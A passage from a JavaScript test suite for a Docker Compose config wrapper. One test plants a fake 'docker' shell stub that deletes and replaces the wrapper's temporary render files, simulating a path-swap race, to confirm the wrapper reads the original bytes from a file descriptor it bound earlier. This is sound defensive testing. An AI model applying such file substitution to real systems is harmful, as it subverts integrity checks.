    fs.writeFileSync(path.join(sandbox.root, "docker-replacement.json"), replacementBytes, {
      mode: 0o600,
    });
    fs.writeFileSync(path.join(sandbox.root, "docker-render-count"), "0\n", { mode: 0o600 });
    writeExecutable(path.join(sandbox.root, "bin", "docker"), `#!/bin/sh
set -eu
sandbox_root=$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)
: > "$sandbox_root/render-attempted"
count=0
IFS= read -r count < "$sandbox_root/docker-render-count"
count=$((count + 1))
printf '%s\\n' "$count" > "$sandbox_root/docker-render-count"
/bin/cat "$sandbox_root/docker-output.json"
for candidate in "$sandbox_root"/hosted-compose-handoff.*/compose-render-*; do
  [ -e "$candidate" ] || continue
  /bin/mv "$candidate" "$candidate.original"
  /bin/rm "$candidate.original"
  /bin/cat "$sandbox_root/docker-replacement.json" > "$candidate"
  : > "$sandbox_root/render-path-swap-fired"
  break
done
`);
    const result = runWrapper(
      sandbox,
      ["config", "--format", "json"],
      { TMPDIR: sandbox.root },
    );
    assert.equal(
      fs.existsSync(path.join(sandbox.root, "render-attempted")),
      true,
      "renderer attempt marker did not fire",
    );
    assert.equal(
      fs.readFileSync(path.join(sandbox.root, "docker-render-count"), "utf8").trim(),
      "1",
      "wrapper rendered more than once",
    );
    assert.equal(
      fs.existsSync(path.join(sandbox.root, "render-path-swap-fired")),
      false,
      "renderer observed a handoff pathname that should already be unlinked",
    );
    assert.equal(result.status, 0, result.stderr);
    assert.equal(result.stdout, originalBytes, "wrapper did not consume the pre-bound render FD");
    assert.notEqual(result.stdout, replacementBytes, "replacement pathname became validated authority");
  } finally {
    removeSandbox(sandbox);
  }
});

test("QA8 no-hosted mode rejects a complete runtime identity tuple instead of ignoring it", () => {
  const sandbox = createConsumerSandbox();
  try {
    const environment = installQa8Environment(sandbox);
    const lock = JSON.parse(fs.readFileSync(sandbox.canonicalLock, "utf8"));
    const config = selectQa8AcceptedBaseline(sandbox, lock, environment).config;
    materializeQa8CanonicalSources(sandbox, config);
    const bytes = `${JSON.stringify(config)}\n`;
    writeDockerOutput(sandbox, bytes);
    const baseline = runWrapper(sandbox, ["config", "--format", "json"]);
    assert.equal(baseline.status, 0, baseline.stderr);
    assert.equal(baseline.stdout, bytes, "runtime tuple baseline changed renderer bytes");
    fs.rmSync(sandbox.dockerMarker, { force: true });
    const result = runWrapper(sandbox, ["config", "--format", "json"], {
      PLATFORM_RUNTIME_CANDIDATE_ID: "a".repeat(64),
      PLATFORM_RUNTIME_COMMIT: "b".repeat(40),
      PLATFORM_RUNTIME_TREE: "c".repeat(40),
      PLATFORM_RUNTIME_DEPLOYMENT_ID: "deploy-qa8-20260728",
      PLATFORM_RUNTIME_SOURCE_RENDER_SHA256: "d".repeat(64),
      PLATFORM_RUNTIME_WORKLOAD_LOCK_SHA256: "e".repeat(64),
    });
    assert.notEqual(result.status, 0, "no-hosted silently ignored a complete runtime identity tuple");
    assert.equal(fs.existsSync(sandbox.dockerMarker), false, "ignored runtime identity reached renderer");
    assert.match(
      result.stderr,
      /(?:no-hosted.*runtime identity|runtime identity.*no-hosted)/i,
      `runtime tuple failed before renderer for an unrelated reason:\n${result.stderr}`,
    );
  } finally {
    removeSandbox(sandbox);
  }
});
